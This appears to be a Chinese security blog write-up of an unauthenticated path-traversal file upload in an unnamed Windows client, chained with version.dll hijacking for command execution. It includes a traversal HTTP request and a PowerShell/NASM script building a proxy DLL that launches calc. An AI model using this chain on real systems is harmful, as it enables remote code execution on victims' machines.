---
title: 【代码审计】客户端漏洞之未授权文件上传+dll劫持实现命令执行rce
url: https://mp.weixin.qq.com/s/D2m2ZOz9MNtRLIB35DMb7Q
source: Doonsec's feed
date: 2026-07-07
fetch_date: 2026-07-08T05:00:23.624037
---

# 【代码审计】客户端漏洞之未授权文件上传+dll劫持实现命令执行rce

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vRTpz13XcL9sqyGHLibH1UWHkrfcmhnicak005zvx6QibqjxkFSAqeia6FpYs9bobFJpVCmMr75U7LbFORAC6ZKREO1TOwEVKcicL3GWbK6pMlFI/0?wx_fmt=jpeg)

# 【代码审计】客户端漏洞之未授权文件上传+dll劫持实现命令执行rce

原创

挖个洞先
挖个洞先

挖个洞先

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**“** 悠仁，你很强，所以要去帮助别人。在你力所能及的范围之内就行，能救的人都去救。迷茫也无所谓，不被人感谢也别在意，总之尽可能多地帮助别人。你要在众人的簇拥下死去。——《咒术回战》S1E1 **”**

01

—

操作步骤

1、Parameters.ini配置文件定义HTTP端口80

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9Matb6sqsvIhEqutmu5x8auBFBdiaB0wGLicMCZNv8bUeoVqZiaThfvFarQezZAe713PHw9j7ZdkUTYOgCftlf7lO4qHiaiblFauFU/640?wx_fmt=png&from=appmsg)

2、查看80发现绑定0.0.0.0，可以远程攻击

```
netstat -ano | findstr ":80"Get-Process -Id 3128
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL8xYgqr5Xpic6TX6WVs1b6nD6xQGB9fyWd9d7mhMo3tIagZ7GZ839SL2z4z3SFx9Cy8f3Yj2nY8F5H4RE4PzQFKRLOOWkBgafNM/640?wx_fmt=png&from=appmsg)

3、导入Server.exe，Strings搜索/定位接口

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL8eRC36oeiaNcyyrDeL2IFwVBaxhDESMticNibr7wL7TvVHjuPAQbEh3T9vKo5QgRS8BAJTG29CWjRJqribtjaQ401uhtPq0R72mPs/640?wx_fmt=png&from=appmsg)

4、点击/UploadFile，

查看交叉引用进入\_TfrmMain\_HTTPServerCommandGet函数

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL8G17z6gz3XAcHvgrrS26ibQKlZ2zD3fxiaT4alrkG32nic8VTuic2Eu4OwABoVWia5icln7gtxbuCSFLJszlwpcuOC3PVX72oia85ibaU/640?wx_fmt=png&from=appmsg)

5、定位到代码

```
如果接口是UploadFile进入条件分支else if ( (unsigned __int8)unknown_libname_145(*(_DWORD *)(v169 + 164), &str__UploadFile[1]) )参数名是fileClasses::TStrings::GetValue(*(Classes::TStrings **)(v169 + 144), (const int)&str_file[1]);UploadDir直接拼接，存在目录穿越System::__linkproc__ LStrCatN(v153, 4, v13, &str__UploadDir_[1], *(_DWORD *)v153);
```

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLibK1mkXEppzErsAhTcT9KDAMo7zEFElcjQtk1KAeDMaibicoWXtibBgafqH5IhOnTeYTeEc0g6ajGNUDQy8Dhbictia36pEiaU7Ihkias/640?wx_fmt=png&from=appmsg)

6、构造数据包，使用另一台机器发包

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL81vSicVunYxFLFmgcOwXyxEdeF1SH6Lg3fhJ7shib09ounJ5hBJj8RibjkwbII6URcEzbq7j3g2Qh38VqgdZkliavbmtfEHU0pKp0/640?wx_fmt=png&from=appmsg)

```
POST /UploadFile?file=../../../../../../../../../123.txt HTTP/1.1Host: 192.168.31.110Content-Type: application/octet-streamContent-Length: 3Connection: close123
```

7、成功上传到安装目录的根路径

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL8dkIzFRAoHN7whJzCn7pAgtiaLvsf07jqwiamZ08xY44aqa4p78SdUje8cH1jC6uNrdLvfOR3VDSdPQic9yLXe4boBVRO3jibDFkA/640?wx_fmt=png&from=appmsg)

8、查看Imports，version.dll没写绝对路径，存在dll劫持

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLibI1jPPRicCz9kx3AE7tEC4pjIoadzTmZVpI60cWkVl5Mn1fDcic25f8jNDicxeuB80n68GaxicF8fwstBoTSHXjosUvWc4lXqqUwk/640?wx_fmt=png&from=appmsg)

9、构造version.dll

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcLicCV82pFYEOAX64PYfADf82iaZM1065Q2k1WWUf9YkAVvgxibpw7SWm54zsEfOiagnbxPriapTnia3K8CrlOPrLxfXhHS9baFRM8oibQ/640?wx_fmt=png&from=appmsg)

```
param(    [string]$ToolRoot = $env:W64DEVKIT_ROOT,    [string]$BuildRoot = $env:VULN02_BUILD_ROOT,    [string]$OutputPath = "")$ErrorActionPreference = "Stop"$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }if ([string]::IsNullOrWhiteSpace($OutputPath)) {    $OutputPath = Join-Path $scriptDir "version.dll"}$embeddedAsm = @'bits 32extern _GetProcAddressextern _LoadLibraryWextern _WinExecglobal _DllMain@12global _GetFileVersionInfoAglobal _GetFileVersionInfoSizeAglobal _VerQueryValueAsection .data    h_realver dd 0    p_GetFileVersionInfoA dd 0    p_GetFileVersionInfoSizeA dd 0    p_VerQueryValueA dd 0    n_GetFileVersionInfoA db "GetFileVersionInfoA", 0    n_GetFileVersionInfoSizeA db "GetFileVersionInfoSizeA", 0    n_VerQueryValueA db "VerQueryValueA", 0    cmd_calc db "calc", 0    realver_path:        dw 'C', ':', '\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\'        dw 'S', 'y', 's', 'W', 'O', 'W', '6', '4', '\'        dw 'v', 'e', 'r', 's', 'i', 'o', 'n', '.', 'd', 'l', 'l', 0section .textensure_real:    cmp dword [h_realver], 0    jne .done    push realver_path    call _LoadLibraryW    mov [h_realver], eax.done:    retresolve_real:    push ebp    mov ebp, esp    push ebx    call ensure_real    mov eax, [ebp + 8]    push eax    push dword [h_realver]    call _GetProcAddress    mov ebx, [ebp + 12]    mov [ebx], eax    pop ebx    pop ebp    ret 8_DllMain@12:    push ebp    mov ebp, esp    cmp dword [ebp + 12], 1    jne .ret_true    push 1    push cmd_calc    call _WinExec.ret_true:    mov eax, 1    pop ebp    ret 12_GetFileVersionInfoA:    cmp dword [p_GetFileVersionInfoA], 0    jne .go    push p_GetFileVersionInfoA    push n_GetFileVersionInfoA    call resolve_real.go:    jmp dword [p_GetFileVersionInfoA]_GetFileVersionInfoSizeA:    cmp dword [p_GetFileVersionInfoSizeA], 0    jne .go    push p_GetFileVersionInfoSizeA    push n_GetFileVersionInfoSizeA    call resolve_real.go:    jmp dword [p_GetFileVersionInfoSizeA]_VerQueryValueA:    cmp dword [p_VerQueryValueA], 0    jne .go    push p_VerQueryValueA    push n_VerQueryValueA    call resolve_real.go:    jmp dword [p_VerQueryValueA]'@$embeddedKernelDef = @'LIBRARY KERNEL32.dllEXPORTS    GetProcAddress    LoadLibraryW    WinExec'@$embeddedExportDef = @'LIBRARY version.dllEXPORTS    GetFileVersionInfoA=GetFileVersionInfoA    GetFileVersionInfoSizeA=GetFileVersionInfoSizeA    VerQueryValueA=VerQueryValueA'@function Test-AsciiPath {    param([Parameter(Mandatory = $true)][string]$Path)    foreach ($ch in $Path.ToCharArray()) {        if ([int][char]$ch -gt 127) {            return $false        }    }    return $true}function Add-CandidatePath {    param(        [System.Collections.Generic.List[string]]$List,        [string]$Path    )    if (-not [string]::IsNullOrWhiteSpace($Path) -and -not $List.Contains($Path)) {        [void]$List.Add($Path)    }}function Resolve-Tool {    param([Parameter(Mandatory = $true)][string]$Name)    $candidates = [System.Collections.Generic.List[string]]::new()    if (-not [string]::IsNullOrWhiteSpace($ToolRoot)) {        Add-CandidatePath $candidates (Join-Path $ToolRoot "bin/$Name")        Add-CandidatePath $candidates (Join-Path $ToolRoot $Name)    }    Add-CandidatePath $candidates (Join-Path $scriptDir "w64devkit/bin/$Name")    Add-CandidatePath $candidates (Join-Path (Split-Path -Parent $scriptDir) "w64devkit/bin/$Name")    Add-CandidatePath $candidates "D:/path/gcc-w64devkit-1.22.0/w64devkit/bin/$Name"    $command = Get-Command $Name -ErrorAction SilentlyContinue    if ($command) {        Add-CandidatePath $candidates $command.Source    }    foreach ($candidate in $candidates) {        if (Test-Path -LiteralPath $candidate) {            return (Resolve-Path -LiteralPath $candidate).Path        }    }    throw "Tool not found: $Name. Add w64devkit/bin to PATH, or run with -ToolRoot, for example: ./build_nasm_x86.ps1 -ToolRoot C:/tools/w64devkit"}function Resolve-AsciiBuildDir {    $roots = [System.Collections.Generic.List[string]]::new()    Add-CandidatePath $roots $BuildRoot    Add-CandidatePath $roots "D:/win/tmpascii"    Add-CandidatePath $roots $env:TEMP    Add-CandidatePath $roots $env:TMP    if (-not [string]::IsNullOrWhiteSpace($env:SystemRoot)) {        Add-CandidatePath $roots (Join-Path $env:SystemRoot "Temp")    }    Add-CandidatePath $roots "C:/Temp"    foreach ($root in $roots) {        try {            New-Item -ItemType Directory -Force -Path $root | Out-Null            $fullRoot = [System.IO.Path]::GetFullPath($root)            if (-not (Test-AsciiPath $fullRoot)) {                continue            }            $dir = Join-Path $fullRoot "vuln02_version_build"            New-Item -ItemType Directory -Force -Path $dir | Out-Null            return $dir        } catch {            continue        }    }    throw "No writable ASCII build directory found. Use -BuildRoot C:/Temp, or set VULN02_BUILD_ROOT."}function Write-AsciiFile {    param(        [Parameter(Mandatory = $true)][string]$Path,        [Parameter(Mandatory = $true)][string]$Content    )    $parent = Split-Path -Parent $Path    New-Item -ItemType Directory -Force -Path $parent | Out-Null    [System.IO.F...